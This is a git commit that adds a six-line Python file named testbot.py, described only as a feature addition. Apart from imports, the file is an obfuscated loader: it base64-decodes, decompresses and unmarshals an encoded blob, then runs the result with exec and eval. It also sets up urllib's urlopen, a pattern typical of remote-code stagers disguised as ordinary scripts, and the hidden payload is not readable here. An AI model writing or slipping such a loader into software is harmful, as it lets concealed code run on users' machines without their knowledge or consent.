a3d4617be5cb2e9ba3b13da4705768d25e0f168e
Magda Bagda <magdaburas1719@gmail.com>
2020-06-24 22:06:49 +0200

    feat: testbot.py added

---
+++ testbot.py
@@ -0,0 +1,6 @@
+import sys, zlib, base64, marshal, json, urllib
+if sys.version_info[0] > 2:
+	from urllib import request
+	urlopen = urllib.request.urlopen if sys.version_info[0]>2 else urllib.urlopen
+exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrNmNgYCgtyskvSMTUM8oKSmw0tc3NN
+Az0DPSMzS1MjEx09cvLklMTy0q1i81NdIrqFTX1CtKTUzR0AQA72wQxQ==')))))
